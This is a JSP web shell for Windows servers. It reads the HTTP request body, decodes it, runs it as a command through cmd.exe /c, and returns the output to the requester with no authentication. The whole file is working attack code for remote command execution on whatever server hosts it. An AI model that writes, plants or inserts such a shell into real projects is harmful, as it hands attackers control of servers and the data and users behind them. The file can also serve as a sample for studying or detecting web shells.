<%@page import="java.io.*, java.util.*, javax.xml.bind.*, java.net.*"%>
<%!
	public String v(String w){
		String x="";
		try{
			x=URLDecoder.decode(w,"UTF-8");
		}catch(Exception e){}
		return x;
	}
%>
<%
	String o,l,d;
	o=l=d="";
	DataInputStream r=new DataInputStream(request.getInputStream());
	while((l=r.readLine())!=null){
		d+=l;
	}

        String g=v(d.substring(2));
        String s;
        try{
                // https://stackoverflow.com/a/5928316/5832619
                String[] cmdarray = {
                    "cmd.exe",
                    "/c",
                    g,
                };

                Process p=Runtime.getRuntime().exec(cmdarray);
                DataInputStream i=new DataInputStream(p.getInputStream());
                while((s=i.readLine())!=null){
                        o+=s + "\n";
                }
        }catch(Exception e){
                out.print(e);
        }
%>
<%=o%>

